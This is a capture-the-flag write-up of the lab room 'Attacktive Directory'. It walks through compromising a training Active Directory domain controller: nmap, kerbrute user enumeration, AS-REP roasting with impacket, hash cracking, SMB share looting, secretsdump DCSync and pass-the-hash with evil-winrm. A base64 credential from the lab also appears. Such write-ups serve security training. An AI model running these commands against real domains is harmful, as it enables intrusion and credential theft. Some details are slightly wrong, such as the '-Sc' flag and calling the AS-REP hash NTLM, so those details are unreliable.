#	Room 	Attacktive Directory
#	Mayank Srivastava | 17 dec 2020
--------------------------------------------
##	Target OS 	Windows
##	Difficulty 	Easy
##	Description 	99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?
##	Maker 	Sq00ky
---------------------------------------------

#	Reconnaissance
``` As always I can Run a nmap scan against the IP  ```

```-sC for Default script -sV for Enumerating versions -oN default nmap Output```

```nmap -Sc -sV -oN nmap <target_ip> ```

```
# Nmap 7.91 scan initiated Thu Dec 17 19:05:58 2020 as: nmap -sC -sV -oN nmap/initial 10.10.103.197
Nmap scan report for 10.10.103.197
Host is up (0.63s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-12-17 13:36:21Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-17T13:36:57+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2020-09-16T22:48:24
|_Not valid after:  2021-03-18T22:48:24
|_ssl-date: 2020-12-17T13:37:08+00:00; +2s from scanner time.
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-12-17T13:36:58
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 17 19:07:24 2020 -- 1 IP address (1 host up) scanned in 86.47 seconds
```

## Enumerating Port 80

We can start by looking at the webserver. There's default IIS web page also we can do directory bruteforcing but this box is related to Active Directory so let's Move forward. There is a DNS domain name that i am going set spoookysec.local in ```/etc/hosts``` file.

## Enumerating SMB

Let's try to Enumerate 139,445 ports.
using enum4linux
```
enum4linux -a spookysec.local
Nmap Output suggested our Domain Name was spookysec.local however, enum4linux shows THM-AD.
I can see enum4linux failed to provide much inforamtion such as 
users.
```
## Kerbrute

we can try kerbrute to  get users of DC
```kerbrute username --dc spookysec.local -d spookysec.local userlist.txt```
After running this command i have some vaild users of DC.
 
```
2020/10/01 04:50:02 >  [+] VALID USERNAME:       james@spookysec.local
2020/10/01 04:50:06 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2020/10/01 04:50:12 >  [+] VALID USERNAME:       James@spookysec.local
2020/10/01 04:50:14 >  [+] VALID USERNAME:       robin@spookysec.local
2020/10/01 04:50:36 >  [+] VALID USERNAME:       darkstar@spookysec.local
2020/10/01 04:50:50 >  [+] VALID USERNAME:       administrator@spookysec.local
2020/10/01 04:51:28 >  [+] VALID USERNAME:       backup@spookysec.local
2020/10/01 04:51:41 >  [+] VALID USERNAME:       paradox@spookysec.local
2020/10/01 04:53:01 >  [+] VALID USERNAME:       JAMES@spookysec.local
2020/10/01 04:53:28 >  [+] VALID USERNAME:       Robin@spookysec.local
2020/10/01 04:56:11 >  [+] VALID USERNAME:       Administrator@spookysec.local
2020/10/01 05:02:01 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2020/10/01 05:03:55 >  [+] VALID USERNAME:       Paradox@spookysec.local
2020/10/01 05:10:02 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2020/10/01 05:11:51 >  [+] VALID USERNAME:       ori@spookysec.local
2020/10/01 05:15:01 >  [+] VALID USERNAME:       ROBIN@spookysec.local
```
## Exploiting Kerberos


Now i am going to crack Active Directory password with AS-REP Roasting. This is an attack agains Kerberos for user accounts that do not require pre-authentication.

```python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -usersfile valid-users.txt```

After running this command i got ```NTLM``` hash


## Cracking 

i can't wait let's decrypt the hash using john and login to ```smb```.
Also you can use ```hashcat``` for cracking the hash use mode number ```18200``` for hash

## john

``` john scv-admin.txt --wordlist=/opt/password.txt```

## hashcat

```
hashcat -m 18200 svc-admin.txt /opt/password.txt --force
```

```Running john and hashcat will gave you a password.```

now at this stage i have smb username and password so let's try to login using smbclient

```
smbclient -L //<target_ip>/ --user svc-admin


 Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```
I found some shares and ```backup``` seems interesting.I found ```backup_credentials.txt``` file inside the ```backup```. Let's take a look at what's that include.

``` YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw ```
it's a base64 encoding.
Decrypting will give me another credential for the user backup.

## Elevating Privileges 

``` 
python secretsdump.py -just-dc backup@spookysec.local
```

Dumping this revels administrator NTLM hash. Now i can crack the hash or use ```evil-winrm``` to connect the administrator.

```
./evil-winrm.rb -i 10.10.225.20 -u Administrator -H (HASH HERE PLEASE)
```

# Thanks For Reading